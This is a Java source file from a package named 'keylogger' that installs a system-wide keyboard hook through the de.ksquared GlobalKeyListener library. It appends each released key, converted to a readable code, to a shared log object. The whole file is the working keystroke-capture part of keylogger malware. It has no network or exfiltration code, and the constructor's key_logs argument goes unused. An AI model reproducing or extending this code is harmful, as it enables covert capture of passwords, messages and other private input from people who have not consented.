package keylogger;

import de.ksquared.system.keyboard.GlobalKeyListener;
import de.ksquared.system.keyboard.KeyAdapter;
import de.ksquared.system.keyboard.KeyEvent;

public class KeyBoardHookListener {
    KeyLogsDataPress log = KeyLogsDataPress.getInstance();
    KeyBoardHookListener(String key_logs){
        new GlobalKeyListener().addKeyListener(new KeyAdapter() {
	@Override public void keyPressed(KeyEvent event) { 
            }
            @Override public void keyReleased(KeyEvent event) {
                log.SetLogs(
                    log.GetLogs()+
                    new ConvertVirtualKeyCodeToKeyBoardCode().GetKeyBoardCode(event));
            }
	});
    }
}
